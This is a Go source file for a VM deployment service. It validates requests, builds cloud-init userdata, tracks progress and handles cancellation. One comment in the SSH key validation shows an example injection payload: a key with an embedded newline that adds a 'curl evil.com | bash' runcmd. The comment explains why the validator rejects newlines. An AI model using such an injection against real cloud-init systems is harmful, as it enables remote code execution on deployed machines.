package service

import (
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"net"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/forgemill/forgemill/internal/db"
	"github.com/forgemill/forgemill/internal/db/models"
	"github.com/forgemill/forgemill/internal/provider"
)

// V3-H11: VM name validation pattern
var validVMName = regexp.MustCompile(`^[a-zA-Z0-9][a-zA-Z0-9._-]*$`)

type DeployService struct {
	db        *db.DB
	targets   *TargetService
	hub       ProgressHub
	webhooks  *WebhookService
	notifier  *NotificationService
	encryptor Encryptor
	onDeployComplete func() // called after a deployment completes
	// V3-H8: Cancel map for deployment goroutine cancellation
	mu      sync.Mutex
	cancels map[int64]context.CancelFunc
}

// SetOnDeployComplete registers a callback to run after any deployment completes.
func (s *DeployService) SetOnDeployComplete(fn func()) {
	s.onDeployComplete = fn
}

// SetNotificationService wires the in-app notification service. Optional.
func (s *DeployService) SetNotificationService(n *NotificationService) {
	s.notifier = n
}

type ProgressHub interface {
	SendProgress(deploymentID int64, msg any)
}

type ProgressMessage struct {
	Type string      `json:"type"`
	Data interface{} `json:"data"`
}

type Encryptor interface {
	Encrypt(plaintext string) (string, error)
	Decrypt(encoded string) (string, error)
}

func NewDeployService(db *db.DB, targets *TargetService, hub ProgressHub, webhooks *WebhookService, enc Encryptor) *DeployService {
	return &DeployService{
		db:        db,
		targets:   targets,
		hub:       hub,
		webhooks:  webhooks,
		encryptor: enc,
		cancels:  make(map[int64]context.CancelFunc),
	}
}

type DeployRequest struct {
	TemplateID       int64    `json:"template_id"`
	TargetID         int64    `json:"target_id"`
	VMName           string   `json:"vm_name"`
	Datacenter       string   `json:"datacenter"`
	Cluster          string   `json:"cluster"`
	Host             string   `json:"host,omitempty"`
	Datastore        string   `json:"datastore"`
	Folder           string   `json:"folder"`
	Network          string   `json:"network"`
	CPU              int      `json:"cpu"`
	MemoryMB         int      `json:"memory_mb"`
	DiskGB           int      `json:"disk_gb"`
	IPAddress        string   `json:"ip_address"`
	Netmask          string   `json:"netmask"`
	Gateway          string   `json:"gateway"`
	DNS              []string `json:"dns"`
	Hostname         string   `json:"hostname"`
	DomainName       string   `json:"domain_name"`
	SSHPublicKey     string   `json:"ssh_public_key,omitempty"`
	DiskProvisioning string   `json:"disk_provisioning,omitempty"`
	BulkDeploymentID *int64   `json:"bulk_deployment_id,omitempty"`
	ActionIDs        []int64  `json:"action_ids,omitempty"`
}

// DeployResponse wraps the deployment record with one-time credential fields.
type DeployResponse struct {
	*models.Deployment
	InitialUsername string `json:"initial_username"`
	InitialPassword string `json:"initial_password"`
	SSHKeyInjected  bool   `json:"ssh_key_injected"`
}

// V3-H11: Validate deployment request fields
func validateDeployRequest(req *DeployRequest) error {
	if len(req.VMName) > 64 || !validVMName.MatchString(req.VMName) {
		return fmt.Errorf("invalid VM name: must be 1-64 alphanumeric characters with dashes, dots, or underscores")
	}
	if req.CPU < 1 || req.CPU > 128 {
		return fmt.Errorf("CPU must be between 1 and 128")
	}
	if req.MemoryMB < 256 || req.MemoryMB > 1048576 {
		return fmt.Errorf("memory must be between 256MB and 1TB")
	}
	if req.DiskGB != 0 && (req.DiskGB < 1 || req.DiskGB > 65536) {
		return fmt.Errorf("disk must be between 1GB and 64TB")
	}
	if req.IPAddress != "" && net.ParseIP(req.IPAddress) == nil {
		return fmt.Errorf("invalid IP address")
	}
	if req.Netmask != "" && net.ParseIP(req.Netmask) == nil {
		return fmt.Errorf("invalid netmask address")
	}
	if req.Gateway != "" && net.ParseIP(req.Gateway) == nil {
		return fmt.Errorf("invalid gateway address")
	}
	if len(req.DNS) > 10 {
		return fmt.Errorf("DNS list exceeds maximum of 10 entries")
	}
	for _, dns := range req.DNS {
		if net.ParseIP(dns) == nil {
			return fmt.Errorf("invalid DNS address: %s", dns)
		}
	}
	if req.SSHPublicKey != "" {
		key := strings.TrimSpace(req.SSHPublicKey)
		// HIGH-02 fix: Reject newlines/carriage returns to prevent YAML injection in cloud-init.
		// An attacker could craft a key like "ssh-rsa AAAA...\nruncmd:\n  - curl evil.com | bash"
		// to break out of ssh_authorized_keys and inject arbitrary cloud-init directives.
		if strings.ContainsAny(key, "\n\r") {
			return fmt.Errorf("invalid SSH public key: must not contain newlines")
		}
		if !strings.HasPrefix(key, "ssh-rsa ") && !strings.HasPrefix(key, "ssh-ed25519 ") &&
			!strings.HasPrefix(key, "ecdsa-sha2-") && !strings.HasPrefix(key, "ssh-dss ") {
			return fmt.Errorf("invalid SSH public key: must start with ssh-rsa, ssh-ed25519, ecdsa-sha2-, or ssh-dss")
		}
	}
	return nil
}

func (s *DeployService) Start(req *DeployRequest, userID int64) (*DeployResponse, error) {
	// V3-H11: Validate all deployment request fields
	if err := validateDeployRequest(req); err != nil {
		return nil, err
	}

	tpl, err := s.db.GetTemplate(req.TemplateID)
	if err != nil {
		return nil, fmt.Errorf("template not found: %w", err)
	}

	// Generate temporary credentials for VM access
	plainPassword, err := generatePassword()
	if err != nil {
		return nil, fmt.Errorf("generate password: %w", err)
	}
	passwordHash, err := hashPasswordSHA512(plainPassword)
	if err != nil {
		return nil, fmt.Errorf("hash password: %w", err)
	}

	configJSON, _ := json.Marshal(req)

	// Encrypt the deploy password for storage
	var encPwd string
	if s.encryptor != nil && plainPassword != "" {
		enc, err := s.encryptor.Encrypt(plainPassword)
		if err != nil {
			return nil, fmt.Errorf("encrypt deployment password: %w", err)
		}
		encPwd = enc
	}

	templateID := req.TemplateID
	deployment := &models.Deployment{
		TemplateID:       &templateID,
		TargetID:         req.TargetID,
		VMName:           req.VMName,
		Status:           "pending",
		ConfigJSON:       string(configJSON),
		CreatedBy:        userID,
		BulkDeploymentID: req.BulkDeploymentID,
		InitialUsername:   defaultUsername,
		InitialPwdEnc:    encPwd,
	}
	if err := s.db.CreateDeployment(deployment); err != nil {
		return nil, fmt.Errorf("create deployment: %w", err)
	}

	// Store deployment actions and build merged cloud-init userdata
	if len(req.ActionIDs) > 0 {
		if err := s.db.SetDeploymentActions(deployment.ID, req.ActionIDs); err != nil {
			slog.Error("failed to set deployment actions", "deployment_id", deployment.ID, "error", err)
		}
	}

	// Fetch actions and build merged userdata if actions are selected
	var userDataOverride string
	if len(req.ActionIDs) > 0 {
		actions, err := s.db.GetDeploymentActions(deployment.ID)
		if err != nil {
			slog.Error("failed to get deployment actions for merge", "deployment_id", deployment.ID, "error", err)
		} else if len(actions) > 0 {
			userDataOverride = buildFullCloudInitUserdata(passwordHash, plainPassword, strings.TrimSpace(req.SSHPublicKey), req.Hostname, actions)
			slog.Info("merged cloud-init with actions", "deployment_id", deployment.ID, "action_count", len(actions))
		}
	}

	spec := &provider.DeploySpec{
		TemplateName: tpl.Name,
		VMName:       req.VMName,
		Datacenter:   req.Datacenter,
		Cluster:      req.Cluster,
		Host:         req.Host,
		Datastore:    req.Datastore,
		Folder:       req.Folder,
		Network:      req.Network,
		CPU:          req.CPU,
		MemoryMB:     req.MemoryMB,
		DiskGB:       req.DiskGB,
		IPAddress:    req.IPAddress,
		Netmask:      req.Netmask,
		Gateway:      req.Gateway,
		DNS:          req.DNS,
		Hostname:     req.Hostname,
		DomainName:   req.DomainName,
		OSType:           tpl.OSType,
		PasswordHash:     passwordHash,
		PlainPassword:    plainPassword, // BUG-03: Proxmox needs plaintext for cipassword
		SSHPublicKey:     strings.TrimSpace(req.SSHPublicKey),
		UserDataOverride: userDataOverride,
		DiskProvisioning: req.DiskProvisioning,
	}

	// MED-15: Use context.WithTimeout to prevent goroutine leaks on stalled deployments (4h max)
	// V3-H8: Also supports user cancellation via the cancel function
	ctx, cancel := context.WithTimeout(context.Background(), 4*time.Hour)
	s.mu.Lock()
	s.cancels[deployment.ID] = cancel
	s.mu.Unlock()

	go s.runDeploy(ctx, deployment.ID, req.TargetID, spec)

	return &DeployResponse{
		Deployment:      deployment,
		InitialUsername: defaultUsername,
		InitialPassword: plainPassword,
		SSHKeyInjected:  req.SSHPublicKey != "",
	}, nil
}

func (s *DeployService) runDeploy(ctx context.Context, deploymentID, targetID int64, spec *provider.DeploySpec) {
	// V3-H8: Clean up cancel func when done
	// F-113: Call cancel() to release context resources and prevent goroutine leak
	defer func() {
		s.mu.Lock()
		cancel := s.cancels[deploymentID]
		delete(s.cancels, deploymentID)
		s.mu.Unlock()
		if cancel != nil {
			cancel()
		}
	}()

	if err := s.db.UpdateDeploymentStatus(deploymentID, "running", ""); err != nil {
		slog.Error("deploy: failed to set running status", "deployment_id", deploymentID, "error", err)
	}
	s.addLog(deploymentID, "info", "Starting deployment of VM: "+spec.VMName)
	s.sendProgress(deploymentID, "progress", provider.Progress{Percent: 0, State: "running", Message: "Connecting to target..."})
	s.fireWebhook("deploy.started", deploymentID)

	p, err := s.targets.GetProvider(targetID)
	if err != nil {
		slog.Error("deployment failed: get provider", "deployment_id", deploymentID, "error", err)
		s.failDeploy(deploymentID, "Failed to initialize target provider. The target may be misconfigured.")
		return
	}
	defer p.Disconnect()

	if err := p.Connect(ctx); err != nil {
		slog.Error("deployment failed: connect", "deployment_id", deploymentID, "error", err)
		s.failDeploy(deploymentID, fmt.Sprintf("Failed to connect to target: %s", sanitizeHypervisorError(err)))
		return
	}
	s.addLog(deploymentID, "info", "Connected to target")
	s.sendProgress(deploymentID, "progress", provider.Progress{Percent: 10, State: "running", Message: "Connected, starting clone..."})

	result, err := p.DeployVM(ctx, spec)
	if err != nil {
		slog.Error("deployment failed: deploy VM", "deployment_id", deploymentID, "error", err)
		s.failDeploy(deploymentID, fmt.Sprintf("Hypervisor rejected deployment: %s", sanitizeHypervisorError(err)))
		return
	}
	s.addLog(deploymentID, "info", "Clone task started")
	s.sendProgress(deploymentID, "progress", provider.Progress{Percent: 20, State: "running", Message: "Clone task started..."})

	for {
		// V3-H8: Check for cancellation in the polling loop
		select {
		case <-ctx.Done():
			if err := s.db.UpdateDeploymentStatus(deploymentID, "cancelled", "Cancelled by user"); err != nil {
				slog.Error("deploy: failed to set cancelled status", "deployment_id", deploymentID, "error", err)
			}
			s.addLog(deploymentID, "info", "Deployment cancelled by user")
			s.sendProgress(deploymentID, "error", map[string]string{"message": "Deployment cancelled"})
			s.fireWebhook("deploy.cancelled", deploymentID)
			return
		default:
		}

		progress, err := p.GetDeployProgress(ctx, result.TaskID)
		if err != nil {
			slog.Error("deployment failed: get progress", "deployment_id", deploymentID, "error", err)
			s.failDeploy(deploymentID, fmt.Sprintf("Lost connection while monitoring deployment: %s. Check if VM was partially created.", sanitizeHypervisorError(err)))
			return
		}

		adjustedPercent := 20 + (progress.Percent * 80 / 100)
		s.sendProgress(deploymentID, "progress", provider.Progress{
			Percent: adjustedPercent,
			State:   progress.State,
			Message: progress.Message,
		})
		s.addLog(deploymentID, "info", progress.Message)

		if progress.State == "success" {
			if err := s.db.UpdateDeploymentStatus(deploymentID, "completed", ""); err != nil {
				slog.Error("deploy: failed to set completed status", "deployment_id", deploymentID, "error", err)
			}
			s.addLog(deploymentID, "info", "Deployment completed successfully")
			s.sendProgress(deploymentID, "complete", provider.Progress{Percent: 100, State: "completed", Message: "Deployment completed"})

			// Register deployed VM in managed_vms for /api/vms listing
			vm := &models.ManagedVM{
				DeploymentID: &deploymentID,
				TargetID:     targetID,
				VMName:       spec.VMName,
				VMRef:        result.VMID,
				PowerState:   "poweredOn",
				IPAddress:    spec.IPAddress,
				CPU:          spec.CPU,
				MemoryMB:     spec.MemoryMB,
				DiskGB:       spec.DiskGB,
				OSType:       "linux",
				TemplateName: spec.TemplateName,
			}
			if err := s.db.UpsertManagedVM(vm); err != nil {
				slog.Error("failed to register managed VM", "deployment_id", deploymentID, "error", err)
			}

			s.fireWebhook("deploy.completed", deploymentID)
			if s.onDeployComplete != nil {
				s.onDeployComplete()
			}
			return
		}
		if progress.State == "error" {
			slog.Error("deployment failed from hypervisor", "deployment_id", deploymentID, "error", progress.Message)
			s.failDeploy(deploymentID, fmt.Sprintf("Hypervisor task failed: %s", progress.Message))
			return
		}
		time.Sleep(3 * time.Second)
	}
}

// sanitizeHypervisorError extracts a user-friendly message from hypervisor errors.
// Hypervisor errors (govmomi, Proxmox API) are generally safe to expose — they
// contain technical details like "datastore not found" or "disk space" but not
// credentials. This strips any URL-like patterns and truncates for display.
func sanitizeHypervisorError(err error) string {
	if err == nil {
		return "unknown error"
	}
	msg := err.Error()
	// Strip URL patterns that might contain hostnames (but not credentials — govmomi doesn't include those)
	// Keep it simple: just truncate and clean up
	if len(msg) > 200 {
		msg = msg[:200] + "..."
	}
	// Remove common govmomi prefixes that add noise
	msg = strings.TrimPrefix(msg, "ServerFaultCode: ")
	msg = strings.TrimPrefix(msg, "task error: ")
	if msg == "" {
		return "unknown error"
	}
	return msg
}

func (s *DeployService) failDeploy(deploymentID int64, msg string) {
	slog.Error("deployment failed", "deployment_id", deploymentID, "error", msg)
	s.db.UpdateDeploymentStatus(deploymentID, "failed", msg)
	s.addLog(deploymentID, "error", msg)
	s.sendProgress(deploymentID, "error", map[string]string{"message": msg})
	s.fireWebhook("deploy.failed", deploymentID)
}

func (s *DeployService) addLog(deploymentID int64, level, message string) {
	s.db.AddDeploymentLog(&models.DeploymentLog{
		DeploymentID: deploymentID,
		Level:        level,
		Message:      message,
	})
	s.sendProgress(deploymentID, "log", map[string]string{"level": level, "message": message})
}

func (s *DeployService) sendProgress(deploymentID int64, msgType string, data interface{}) {
	if s.hub != nil {
		s.hub.SendProgress(deploymentID, ProgressMessage{Type: msgType, Data: data})
	}
}

func (s *DeployService) fireWebhook(event string, deploymentID int64) {
	if s.webhooks == nil && s.notifier == nil {
		return
	}
	deployment, err := s.db.GetDeployment(deploymentID)
	if err != nil {
		slog.Error("failed to get deployment for webhook", "deployment_id", deploymentID, "error", err)
		return
	}
	if s.webhooks != nil {
		s.webhooks.Fire(event, deployment)
	}
	// Fan out to in-app notifications for the events users care about.
	if s.notifier != nil {
		switch event {
		case "deploy.completed":
			s.notifier.NotifyDeployCompleted(deployment)
		case "deploy.failed":
			s.notifier.NotifyDeployFailed(deployment)
		}
	}
}

func (s *DeployService) Get(id int64) (*models.Deployment, error) {
	d, err := s.db.GetDeployment(id)
	if err != nil {
		return nil, err
	}
	logs, err := s.db.GetDeploymentLogs(id)
	if err != nil {
		return nil, err
	}
	d.Logs = logs
	return d, nil
}

// V3-H8: Cancel uses context cancellation to stop the deploy goroutine.
// The runDeploy goroutine handles the status update on ctx.Done() to avoid race conditions.
func (s *DeployService) Cancel(id int64) error {
	s.mu.Lock()
	cancel, ok := s.cancels[id]
	s.mu.Unlock()
	if !ok {
		// No cancel func: deploy may have already finished or never started.
		return s.db.UpdateDeploymentStatus(id, "cancelled", "Cancelled by user")
	}
	// Signal the goroutine; it will update the status itself via ctx.Done()
	cancel()
	return nil
}

func (s *DeployService) ListHistory(f db.DeploymentFilter) (*db.PaginatedDeployments, error) {
	return s.db.ListDeployments(f)
}
